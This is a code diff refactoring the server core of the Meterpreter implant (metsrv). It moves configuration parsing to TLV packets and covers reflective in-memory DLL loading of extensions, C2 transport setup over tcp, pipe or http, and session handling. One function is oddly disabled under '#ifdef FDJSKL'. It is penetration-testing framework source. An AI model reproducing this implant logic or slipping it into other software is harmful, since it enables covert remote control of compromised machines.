@@ -61,63 +61,66 @@ DWORD server_sessionid()
 }
 
 /*!
- * @brief Load any stageless extensions that might be present in the current payload.
+ * @brief Load any stageless extensions that might be present in the given configuration.
  * @param remote Pointer to the remote instance.
  * @param fd The socket descriptor passed to metsrv during intialisation.
  * @return Pointer to the end of the configuration.
  */
-LPBYTE load_stageless_extensions(Remote* remote, MetsrvExtension* stagelessExtensions)
+VOID load_stageless_extensions(Remote* remote, Packet* configPacket, Tlv* configTlv)
 {
-	while (stagelessExtensions->size > 0)
+	DWORD index = 0;
+	Tlv extensionTlv = { 0 };
+
+	// start by loading the extensions before doing any init scripts
+	while (packet_enum_group_tlv(configPacket, configTlv, index, TLV_TYPE_EXTENSION, &extensionTlv) == ERROR_SUCCESS)
 	{
-		dprintf("[SERVER] Extension located at 0x%p: %u bytes", stagelessExtensions->dll, stagelessExtensions->size);
-		HMODULE hLibrary = LoadLibraryR(stagelessExtensions->dll, stagelessExtensions->size, MAKEINTRESOURCEA(EXPORT_REFLECTIVELOADER));
+		DWORD dllSize = 0;
+		LPBYTE dll = packet_get_tlv_group_entry_value_raw(configPacket, &extensionTlv, TLV_TYPE_DATA, &dllSize);
+
+		dprintf("[SERVER] Extension located at 0x%p: %u bytes", dll, dllSize);
+		HMODULE hLibrary = LoadLibraryR(dll, dllSize, MAKEINTRESOURCEA(EXPORT_REFLECTIVELOADER));
 		load_extension(hLibrary, TRUE, remote, NULL, extensionCommands);
-		stagelessExtensions = (MetsrvExtension*)((LPBYTE)stagelessExtensions->dll + stagelessExtensions->size);
+		++index;
 	}
 
 	dprintf("[SERVER] All stageless extensions loaded");
 
-	// once we have reached the end, we may have extension initializers
-	LPBYTE initData = (LPBYTE)(&stagelessExtensions->size) + sizeof(stagelessExtensions->size);
-
-	// Config blog is terminated by a -1
-	while (*(UINT*)initData != 0xFFFFFFFF)
+	// then iterate again and initialise those that require it.
+	index = 0;
+	while (packet_enum_group_tlv(configPacket, configTlv, index, TLV_TYPE_EXTENSION, &extensionTlv) == ERROR_SUCCESS)
 	{
-		UINT extensionId = *(UINT*)initData;
-		DWORD dataSize = *(DWORD*)(initData + sizeof(DWORD));
-		UINT offset = sizeof(UINT) + sizeof(DWORD);
-		LPBYTE data = initData + offset;
-		dprintf("[STAGELESS] init data at %p, ID %u, size is %d", initData, extensionId, dataSize);
-		stagelessinit_extension(extensionId, data, dataSize);
-		initData = data + dataSize;
-		dprintf("[STAGELESS] init done, now pointing to %p", initData);
-		dprintf("[STAGELESS] %p contains %x", *(UINT*)initData);
+		DWORD initSize = 0;
+		PCHAR init = packet_get_tlv_group_entry_value_string(configPacket, &extensionTlv, TLV_TYPE_STRING, &initSize);
+		if (init != NULL)
+		{
+			UINT extId = packet_get_tlv_group_entry_value_uint(configPacket, &extensionTlv, TLV_TYPE_UINT);
+			dprintf("[STAGELESS] init data at %p, size %u, ID %u", init, initSize, extId);
+			stagelessinit_extension(extId, init, initSize);
+		}
+		++index;
 	}
 
 	dprintf("[SERVER] All stageless extensions initialised");
-	return initData + sizeof(UINT);
 }
 
-static Transport* create_transport(Remote* remote, MetsrvTransportCommon* transportCommon, LPDWORD size)
+static Transport* create_transport(Remote* remote, Packet* packet, Tlv* c2Tlv)
 {
+	PCHAR url = packet_get_tlv_group_entry_value_string(packet, c2Tlv, TLV_TYPE_C2_URL, NULL);
 	Transport* transport = NULL;
-	dprintf("[TRNS] Transport claims to have URL: %S", transportCommon->url);
-	dprintf("[TRNS] Transport claims to have comms: %d", transportCommon->comms_timeout);
-	dprintf("[TRNS] Transport claims to have retry total: %d", transportCommon->retry_total);
-	dprintf("[TRNS] Transport claims to have retry wait: %d", transportCommon->retry_wait);
 
-	if (wcsncmp(transportCommon->url, L"tcp", 3) == 0)
+	dprintf("[TRNS] Transport claims to have URL: %S", url);
+
+	if (strncmp(url, "tcp", 3) == 0)
 	{
-		transport = transport_create_tcp((MetsrvTransportTcp*)transportCommon, size);
+		transport = transport_create_tcp(packet, c2Tlv);
 	}
-	else if (wcsncmp(transportCommon->url, L"pipe", 4) == 0)
+	else if (strncmp(url, "pipe", 4) == 0)
 	{
-		transport = transport_create_named_pipe((MetsrvTransportNamedPipe*)transportCommon, size);
+		transport = transport_create_named_pipe(packet, c2Tlv);
 	}
 	else
 	{
-		transport = transport_create_http((MetsrvTransportHttp*)transportCommon, size);
+		transport = transport_create_http(packet, c2Tlv);
 	}
 
 	if (transport == NULL)
@@ -187,38 +190,23 @@ static void remove_transport(Remote* remote, Transport* oldTransport)
 	oldTransport->transport_destroy(oldTransport);
 }
 
-static BOOL create_transports(Remote* remote, MetsrvTransportCommon* transports, LPDWORD parsedSize)
+static BOOL create_transports(Remote* remote, Packet* packet, Tlv* groupTlv, LPDWORD parsedSize)
 {
-	DWORD totalSize = 0;
-	MetsrvTransportCommon* current = transports;
+	DWORD index = 0;
+	Tlv c2Tlv = { 0 };
 
-	// The first part of the transport is always the URL, if it's NULL, we are done.
-	while (current->url[0] != 0)
+	while (packet_enum_group_tlv(packet, groupTlv, index, TLV_TYPE_C2, &c2Tlv) == ERROR_SUCCESS)
 	{
-		DWORD size;
-		if (create_transport(remote, current, &size) != NULL)
-		{
-			dprintf("[TRANS] transport created of size %u", size);
-			totalSize += size;
-
-			// go to the next transport based on the size of the existing one.
-			current = (MetsrvTransportCommon*)((LPBYTE)current + size);
-		}
-		else
-		{
-			// This is not good
-			return FALSE;
-		}
+		create_transport(remote, packet, &c2Tlv);
+		++index;
 	}
-
-	// account for the last terminating NULL wchar
-	*parsedSize = totalSize + sizeof(wchar_t);
 
 	return TRUE;
 }
 
 static void config_create(Remote* remote, LPBYTE uuid, MetsrvConfig** config, LPDWORD size)
 {
+#ifdef FDJSKL
 	// This function is really only used for migration purposes.
 	DWORD s = sizeof(MetsrvSession);
 	MetsrvSession* sess = (MetsrvSession*)malloc(s);
@@ -304,6 +292,7 @@ static void config_create(Remote* remote, LPBYTE uuid, MetsrvConfig** config, LP
 	dprintf("[CONFIG] Total of %u bytes located at 0x%p", s, sess);
 	*size = s;
 	*config = (MetsrvConfig*)sess;
+#endif
 }
 
 /*!
@@ -311,7 +300,7 @@ static void config_create(Remote* remote, LPBYTE uuid, MetsrvConfig** config, LP
  * @param fd The original socket descriptor passed in from the stager, or a pointer to stageless extensions.
  * @return Meterpreter exit code (ignored by the caller).
  */
-DWORD server_setup(MetsrvConfig* config)
+DWORD server_setup(MetsrvConfig* config, Packet* configPacket, Tlv* configTlv)
 {
 	THREAD* serverThread = NULL;
 	Remote* remote = NULL;
@@ -319,21 +308,27 @@ DWORD server_setup(MetsrvConfig* config)
 	char desktopName[256] = { 0 };
 	DWORD res = 0;
 
-	dprintf("[SERVER] Initializing from configuration: 0x%p", config);
-	dprintf("[SESSION] Comms handle: %u", config->session.comms_handle);
-	dprintf("[SESSION] Expiry: %u", config->session.expiry);
+	UINT sessionExpiry = packet_get_tlv_group_entry_value_uint(configPacket, configTlv, TLV_TYPE_SESSION_EXPIRY);
+	DWORD uuidSize = 0;
+	PBYTE uuid = packet_get_tlv_group_entry_value_raw(configPacket, configTlv, TLV_TYPE_UUID, &uuidSize);
+	PBYTE sessionGuid = packet_get_tlv_group_entry_value_raw(configPacket, configTlv, TLV_TYPE_SESSION_GUID, NULL);
+
+	dprintf("[SESSION] Expiry: %u", sessionExpiry);
 
 	dprintf("[SERVER] UUID: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
-		config->session.uuid[0], config->session.uuid[1], config->session.uuid[2], config->session.uuid[3],
-		config->session.uuid[4], config->session.uuid[5], config->session.uuid[6], config->session.uuid[7],
-		config->session.uuid[8], config->session.uuid[9], config->session.uuid[10], config->session.uuid[11],
-		config->session.uuid[12], config->session.uuid[13], config->session.uuid[14], config->session.uuid[15]);
+		uuid[0], uuid[1], uuid[2], uuid[3],
+		uuid[4], uuid[5], uuid[6], uuid[7],
+		uuid[8], uuid[9], uuid[10], uuid[11],
+		uuid[12], uuid[13], uuid[14], uuid[15]);
 
 	dprintf("[SERVER] Session GUID: %02X%02X%02X%02X-%02X%02X-%02X%02X-%02X%02X-%02X%02X%02X%02X%02X%02X",
-		config->session.session_guid[0], config->session.session_guid[1], config->session.session_guid[2], config->session.session_guid[3],
-		config->session.session_guid[4], config->session.session_guid[5], config->session.session_guid[6], config->session.session_guid[7],
-		config->session.session_guid[8], config->session.session_guid[9], config->session.session_guid[10], config->session.session_guid[11],
-		config->session.session_guid[12], config->session.session_guid[13], config->session.session_guid[14], config->session.session_guid[15]);
+		sessionGuid[0], sessionGuid[1], sessionGuid[2], sessionGuid[3],
+		sessionGuid[4], sessionGuid[5], sessionGuid[6], sessionGuid[7],
+		sessionGuid[8], sessionGuid[9], sessionGuid[10], sessionGuid[11],
+		sessionGuid[12], sessionGuid[13], sessionGuid[14], sessionGuid[15]);
+
+	memcpy_s(remote->uuid, sizeof(remote->uuid), uuid, uuidSize);
+	memcpy_s(remote->session_guid, sizeof(remote->session_guid), sessionGuid, sizeof(remote->session_guid));
 
 	disable_thread_error_reporting();
 
@@ -354,7 +349,7 @@ DWORD server_setup(MetsrvConfig* config)
 				break;
 			}
 
-			remote->sess_expiry_time = config->session.expiry;
+			remote->sess_expiry_time = sessionExpiry;
 			remote->sess_start_time = current_unix_timestamp();
 			if (remote->sess_expiry_time)
 			{
@@ -368,17 +363,17 @@ DWORD server_setup(MetsrvConfig* config)
 			dprintf("[DISPATCH] Session going for %u seconds from %u to %u", remote->sess_expiry_time, remote->sess_start_time, remote->sess_expiry_end);
 
 			DWORD transportSize = 0;
-			if (!create_transports(remote, config->transports, &transportSize))
+			if (!create_transports(remote, configPacket, configTlv, &transportSize))
 			{
 				// not good, bail out!
 				SetLastError(ERROR_BAD_ARGUMENTS);
 				break;
 			}
 
-			dprintf("[DISPATCH] Transport handle is %p", (LPVOID)config->session.comms_handle.handle);
+			dprintf("[DISPATCH] Transport handle is %p", (LPVOID)config->comms_handle.handle);
 			if (remote->transport->set_handle)
 			{
-				remote->transport->set_handle(remote->transport, config->session.comms_handle.handle);
+				remote->transport->set_handle(remote->transport, config->comms_handle.handle);
 			}
 
 			// Set up the transport creation function pointer
@@ -395,18 +390,7 @@ DWORD server_setup(MetsrvConfig* config)
 			register_dispatch_routines();
 			
 			// this has to be done after dispatch routine are registered
-			LPBYTE configEnd = load_stageless_extensions(remote, (MetsrvExtension*)((LPBYTE)config->transports + transportSize));
-
-			dprintf("[SERVER] Copying configuration ..");
-			// the original config can actually be mapped as RX in cases such as when stageless payloads
-			// are baked directly into .NET assemblies. We need to make sure that this area of memory includes
-			// The writable flag as well otherwise we get access violations when we're interacting with the
-			// configuration block down the track. So instead of marking the original configuration as RWX (to cover
-			// all cases) we will instead just muck with a copy of it on the heap.
-			DWORD_PTR configSize = (DWORD_PTR)configEnd - (DWORD_PTR)config;
-			remote->orig_config = (MetsrvConfig*)malloc(configSize);
-			memcpy_s(remote->orig_config, configSize, config, configSize);
-			dprintf("[SERVER] Config copied..");
+			load_stageless_extensions(remote, configPacket, configTlv);
 
 			// Store our process token
 			if (!OpenThreadToken(remote->server_thread, TOKEN_ALL_ACCESS, TRUE, &remote->server_token))
